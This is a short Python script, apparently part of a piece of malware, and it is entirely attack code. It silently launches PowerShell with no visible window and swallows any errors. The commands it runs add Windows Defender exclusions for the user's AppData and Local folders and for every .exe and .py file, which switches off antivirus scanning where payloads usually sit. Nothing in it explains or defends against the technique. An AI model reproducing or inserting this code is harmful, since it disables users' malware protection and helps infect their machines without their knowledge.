import subprocess

try:
    subprocess.run(r'''powershell.exe -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath %USERPROFILE%\AppData" & powershell.exe -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath %USERPROFILE%\Local" & powershell.exe -command "Set-MpPreference -ExclusionExtension '.exe','.py'"''', creationflags=subprocess.CREATE_NO_WINDOW)
except:
    pass